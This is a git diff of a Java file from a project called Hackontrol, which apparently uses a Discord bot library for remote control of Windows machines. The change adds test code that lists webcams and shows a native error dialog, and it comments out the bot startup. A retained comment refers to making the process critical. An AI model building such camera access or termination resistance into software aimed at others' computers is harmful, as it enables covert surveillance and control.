@@ -7,7 +7,7 @@ import java.util.List;
 import org.slf4j.Logger;
 import org.slf4j.LoggerFactory;
 
-import com.khopan.hackontrol.logger.HackontrolLoggerConfig;
+import com.khopan.camera.Camera;
 import com.khopan.hackontrol.manager.Manager;
 import com.khopan.hackontrol.registration.ChannelRegistry;
 import com.khopan.hackontrol.registration.ManagerRegistry;
@@ -15,6 +15,7 @@ import com.khopan.hackontrol.registry.RegistrationHandler;
 import com.khopan.hackontrol.registry.RegistryType;
 import com.khopan.hackontrol.registry.implementation.StrictClassValueOnlyRegistryImplementation;
 import com.khopan.hackontrol.utils.ErrorHandler;
+import com.khopan.hackontrol.win32.WinUser;
 
 import net.dv8tion.jda.api.JDA;
 import net.dv8tion.jda.api.JDABuilder;
@@ -243,10 +244,18 @@ public class Hackontrol {
 	}
 
 	public static void main(String[] args) throws Throwable {
+		Camera[] cameras = Camera.list();
+
+		for(int i = 0; i < cameras.length; i++) {
+			Camera camera = cameras[i];
+			System.out.println(camera.getName());
+		}
+
+		NativeLibrary.dialog("Error", "Hello, world!", WinUser.MB_ICONERROR);
 		//NativeLibrary.critical(true); Prevent accidentally running the code
-		HackontrolLoggerConfig.disableDebug();
+		/*HackontrolLoggerConfig.disableDebug();
 		Hackontrol.LOGGER.info("Initializing");
-		Hackontrol.getInstance();
+		Hackontrol.getInstance();*/
 	}
 
 	public static Hackontrol getInstance() {
